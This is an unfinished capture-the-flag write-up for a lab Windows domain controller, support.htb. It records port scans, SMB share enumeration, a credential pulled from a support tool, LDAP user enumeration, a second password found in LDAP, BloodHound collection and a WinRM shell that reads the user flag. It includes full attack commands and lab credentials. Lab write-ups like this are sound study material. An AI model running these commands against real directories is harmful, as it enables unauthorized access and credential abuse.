#active-directory
#unfinished
## Vuxscan

```
=== vuxScan results for 10.129.230.181 === 
10.129.230.181 53    open
10.129.230.181 88    open 
10.129.230.181 135   open 
10.129.230.181 139   open 
10.129.230.181 389   open 
10.129.230.181 445   open 
10.129.230.181 464   open 
10.129.230.181 593   open 
10.129.230.181 636   open 
10.129.230.181 3268  open 
10.129.230.181 3269  open 
10.129.230.181 5985  open 
10.129.230.181 49664 open 
10.129.230.181 49667 open 
10.129.230.181 49678 open 
10.129.230.181 49690 open 
10.129.230.181 49695 open 
10.129.230.181 49717 open
```


## Nmap result

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 03:29:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-30T03:30:01
|_  start_date: N/A
```


## Enumerating SMB
#smb 
### Listed Shares

```
 Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
```

### Enumerating share support-tools

Got a file named userinfo.exe

### Analysing userinfo.exe

**It sends TCP and LDAP queries**

Found the LDAP Credential in the TCP request.

``` LDAP Cred
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```


## Enumerating Users using the LDAP creds

```
  nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
LDAP        10.129.230.181  389    DC               [*] Enumerated 20 domain users: support.htb
LDAP        10.129.230.181  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.230.181  389    DC               Administrator                 2022-07-19 23:25:56 0        Built-in account for administering the computer/domain      
LDAP        10.129.230.181  389    DC               Guest                         2022-05-28 16:48:55 0        Built-in account for guest access to the computer/domain    
LDAP        10.129.230.181  389    DC               krbtgt                        2022-05-28 16:33:43 0        Key Distribution Center Service Account                     
LDAP        10.129.230.181  389    DC               ldap                          2022-05-28 16:41:46 0                                                                    
LDAP        10.129.230.181  389    DC               support                       2022-05-28 16:42:00 3                                                                    
LDAP        10.129.230.181  389    DC               smith.rosario                 2022-05-28 16:42:19 0                                                                    
LDAP        10.129.230.181  389    DC               hernandez.stanley             2022-05-28 16:42:34 0                                                                    
LDAP        10.129.230.181  389    DC               wilson.shelby                 2022-05-28 16:42:50 0                                                                    
LDAP        10.129.230.181  389    DC               anderson.damian               2022-05-28 16:43:05 0                                                                    
LDAP        10.129.230.181  389    DC               thomas.raphael                2022-05-28 16:43:21 0                                                                    
LDAP        10.129.230.181  389    DC               levine.leopoldo               2022-05-28 16:43:37 0                                                                    
LDAP        10.129.230.181  389    DC               raven.clifton                 2022-05-28 16:43:53 0                                                                    
LDAP        10.129.230.181  389    DC               bardot.mary                   2022-05-28 16:44:08 0                                                                    
LDAP        10.129.230.181  389    DC               cromwell.gerard               2022-05-28 16:44:24 0                                                                    
LDAP        10.129.230.181  389    DC               monroe.david                  2022-05-28 16:44:39 0                                                                    
LDAP        10.129.230.181  389    DC               west.laura                    2022-05-28 16:44:55 0                                                                    
LDAP        10.129.230.181  389    DC               langley.lucy                  2022-05-28 16:45:10 0                                                                    
LDAP        10.129.230.181  389    DC               daughtler.mabel               2022-05-28 16:45:26 0                                                                    
LDAP        10.129.230.181  389    DC               stoll.rachelle                2022-05-28 16:45:42 0                                                                    
LDAP        10.129.230.181  389    DC               ford.victoria                 2022-05-28 16:45:58 0    
```

### By querying LDAP

**We got the cred for user SUPPORT**

![[Pasted image 20260730155502.png]]

```
suppport : Ironside47pleasure40Watchful
```

## Bloodhound as user Support

```
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.76.13 -c all


INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) 
INFO: Found AD domain: support.htb 
INFO: Getting TGT for user 
INFO: Connecting to LDAP server: dc.support.htb 
INFO: Found 1 domains 
INFO: Found 1 domains in the forest 
INFO: Found 1 computers I
NFO: Connecting to LDAP server: dc.support.htb 
INFO: Found 21 users 
INFO: Found 53 groups 
INFO: Found 2 gpos 
INFO: Found 1 ous 
INFO: Found 19 containers
INFO: Found 0 trusts 
INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc.support.htb INFO: Done in 01M 25S
```

### Bloodhound data Graph

![[Pasted image 20260801104959.png]]

**Owned User Support Can run psremote WINRM in DC.support.htb**

## Evil Win RM

```
evil-winrm-py -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

### **RCE**

![[Pasted image 20260801105206.png]]


``` flag
evil-winrm-py PS C:\Users\support\desktop> cat user.txt

ecad63243a9302383b03722dd53d7e9d
```

#### Users in support host

![[Pasted image 20260801124157.png]]


